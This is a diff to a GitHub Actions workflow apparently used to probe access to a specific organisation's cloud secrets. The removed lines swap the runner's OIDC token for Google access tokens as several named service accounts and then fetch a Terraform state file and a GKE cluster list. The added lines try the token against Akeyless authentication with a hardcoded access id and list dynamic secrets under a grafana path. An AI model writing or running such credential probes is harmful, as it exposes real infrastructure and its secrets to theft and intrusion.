@@ -1,4 +1,4 @@
-name: wif-probe2
+name: jwt-probe
 on:
   workflow_dispatch:
 permissions:
@@ -11,30 +11,20 @@ jobs:
       - name: probe
         run: |
           set +e
-          P() {
-            POOL="$1"; SA="$2"
-            AUD="//iam.googleapis.com/projects/1094498259535/locations/global/workloadIdentityPools/$POOL/providers/github-by-repos"
-            echo "##### $POOL $SA"
+          for AUD in "https://api.akeyless.io" "https://api.gateway.akeyless.celo-networks-dev.org" "akeyless" "https://akeyless.io" "celo-networks-dev"; do
+            echo "##### AUD=$AUD"
             OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$AUD" | jq -r '.value // empty')
-            [ -z "$OIDC" ] && { echo MINT_FAIL; return; }
-            BODY=$(jq -nc --arg a "$AUD" --arg t "$OIDC" '{audience:$a,grantType:"urn:ietf:params:oauth:grant-type:token-exchange",requestedTokenType:"urn:ietf:params:oauth:token-type:access_token",scope:"https://www.googleapis.com/auth/cloud-platform",subjectTokenType:"urn:ietf:params:oauth:token-type:jwt",subjectToken:$t}')
-            STS=$(curl -sS -X POST https://sts.googleapis.com/v1/token -H 'Content-Type: application/json' -d "$BODY")
-            FED=$(printf '%s' "$STS" | jq -r '.access_token // empty' 2>/dev/null)
-            if [ -z "$FED" ]; then echo "STS_FAIL: $(printf '%s' "$STS" | head -c 300)"; return; fi
-            echo "STS_OK"
-            AT=$(curl -sS -X POST "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/$SA:generateAccessToken" -H "Authorization: Bearer $FED" -H 'Content-Type: application/json' -d '{"scope":["https://www.googleapis.com/auth/cloud-platform"]}' | jq -r '.accessToken // empty' 2>/dev/null)
-            if [ -z "$AT" ]; then echo "GAT_FAIL"; return; fi
-            echo "GAT_OK len=${#AT}"
-            echo "--- tfstate-monitoring/default.tfstate"
-            curl -sS -o /tmp/ts.json -w 'HTTP %{http_code} size %{size_download}\n' -H "Authorization: Bearer $AT" "https://storage.googleapis.com/storage/v1/b/tfstate-monitoring/o/default.tfstate?alt=media"
-            head -c 300 /tmp/ts.json; echo
-            echo "--- gke clusters"
-            curl -sS -H "Authorization: Bearer $AT" "https://container.googleapis.com/v1/projects/devopsre/locations/-/clusters" -w '\nHTTP %{http_code}\n' | head -c 500
-            echo
-          }
-          P gh-celo-monorepo celo-monorepo-dev@devopsre.iam.gserviceaccount.com
-          P gh-celo-monorepo-master celo-monorepo@devopsre.iam.gserviceaccount.com
-          P gh-celo-blockchain-dev celo-blockchain-dev@devopsre.iam.gserviceaccount.com
-          P gh-optics-monorepo optics-monorepo-images-dev@devopsre.iam.gserviceaccount.com
-          P gh-optics-monorepo-main optics-monorepo-images@devopsre.iam.gserviceaccount.com
-          P gh-okta-live-config prod-terraform-clabs-okta@security-circle.iam.gserviceaccount.com
+            [ -z "$OIDC" ] && { echo MINT_FAIL; continue; }
+            for AT in jwt oidc; do
+              BODY=$(jq -nc --arg id p-kf9vjzruht6l --arg t "$OIDC" --arg at "$AT" '{"access-id":$id,"access-type":$at,"jwt":$t}')
+              echo "-- access-type=$AT"
+              R=$(curl -sS -X POST https://api.akeyless.io/auth -H 'Content-Type: application/json' -d "$BODY" -w '\nHTTP %{http_code}')
+              echo "$R" | head -c 600; echo
+              TK=$(printf '%s' "$R" | head -n1 | jq -r '.token // empty' 2>/dev/null)
+              if [ -n "$TK" ]; then
+                echo "AUTH_OK"
+                curl -sS -X POST https://api.akeyless.io/list-items -H 'Content-Type: application/json' -d "$(jq -nc --arg t "$TK" '{token:$t,path:"/dynamic-secrets/keys/grafana/clabs"}')" -w '\nHTTP %{http_code}\n' | head -c 1500
+                echo
+              fi
+            done
+          done
